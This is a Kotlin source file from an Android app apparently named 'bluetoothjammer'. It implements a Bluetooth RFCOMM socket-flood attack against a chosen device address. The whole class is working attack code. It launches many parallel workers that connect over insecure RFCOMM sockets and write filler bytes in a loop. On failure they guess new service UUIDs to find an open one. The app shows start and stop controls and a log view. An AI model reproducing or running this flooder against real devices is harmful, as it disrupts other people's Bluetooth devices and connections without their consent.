package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.os.Build
import android.widget.TextView
import androidx.annotation.RequiresApi
import com.eikarna.bluetoothjammer.AttackActivity
import com.google.android.material.textview.MaterialTextView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.yield
import java.io.IOException
import java.util.UUID
import kotlin.coroutines.coroutineContext
import util.Logger

/**
 * Performs an RFCOMM socket flood against [targetAddress].
 *
 * A single instance owns every worker coroutine for the attack, so [stopAttack]
 * can reliably cancel all of them. Previously each thread spawned its own throwaway
 * instance and stopping created yet another instance whose scope was null, which is
 * why the stop button never worked.
 */
class L2capFloodAttack(private val targetAddress: String) {

    private var scope: CoroutineScope? = null

    val isRunning: Boolean
        get() = scope?.isActive == true

    // Base Serial Port Profile UUID; workers randomize the prefix when a connection fails.
    private val baseUUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")

    // Purge oldest messages if the line count exceeds maxLines to keep the log view light.
    private fun purgeOldestMessagesIfNeeded(element: TextView) {
        val maxLines = 100
        val lines = element.text.split("\n")
        if (lines.size > maxLines) {
            element.text = lines.takeLast(maxLines).joinToString("\n")
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    @SuppressLint("MissingPermission")
    fun startAttack(context: Context, element: MaterialTextView, threads: Int) {
        if (isRunning) return

        val bluetoothManager = context.getSystemService(BluetoothManager::class.java)
        val bluetoothAdapter: BluetoothAdapter? = bluetoothManager?.adapter
        val device: BluetoothDevice? = bluetoothAdapter?.getRemoteDevice(targetAddress)
        if (device == null) {
            log(context, element, "Invalid device address: $targetAddress")
            return
        }

        val newScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope = newScope
        repeat(threads.coerceAtLeast(1)) { index ->
            newScope.launch { runWorker(context, element, device, index + 1) }
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun runWorker(
        context: Context,
        element: MaterialTextView,
        device: BluetoothDevice,
        workerId: Int
    ) {
        var uuid = baseUUID

        // Reconnect loop: honours cancellation and isAttacking regardless of logging state,
        // so the attack actually stops when requested.
        while (coroutineContext.isActive && AttackActivity.isAttacking) {
            var socket: BluetoothSocket? = null
            try {
                socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                socket.connect()
                if (socket.isConnected) {
                    log(context, element, "[#$workerId] Connection established. Sending payload..")
                    flood(socket)
                }
            } catch (err: IOException) {
                // Generate a new UUID prefix on failure to probe for an open service record.
                uuid = UUID.fromString(
                    UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                )
                log(context, element, "[#$workerId] Failed to connect, retrying..")
                // Back off briefly so a device that refuses connections doesn't spin the CPU
                // (and flood the log) with instant retries; still cancellable.
                delay(100)
            } finally {
                closeQuietly(socket)
            }
        }
    }

    private suspend fun flood(socket: BluetoothSocket) {
        val dataSize = socket.maxTransmitPacketSize.takeIf { it > 0 } ?: 600
        val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code).toByte() }
        try {
            while (coroutineContext.isActive && AttackActivity.isAttacking && socket.isConnected) {
                socket.outputStream.write(sendBuffer)
                // Cooperative suspension point so cancellation (Stop) takes effect promptly.
                yield()
            }
        } catch (e: IOException) {
            // Connection dropped; the worker loop will attempt to reconnect.
        }
    }

    private fun log(context: Context, element: MaterialTextView, message: String) {
        if (!AttackActivity.loggingStatus) return
        if (context is AttackActivity) {
            context.runOnUiThread {
                if (AttackActivity.isAttacking) {
                    purgeOldestMessagesIfNeeded(element)
                    Logger.appendLog(element, message)
                }
            }
        }
    }

    fun stopAttack() {
        scope?.cancel()
        scope = null
    }

    private fun closeQuietly(socket: BluetoothSocket?) {
        try {
            socket?.close()
        } catch (e: IOException) {
            // ignore
        }
    }
}
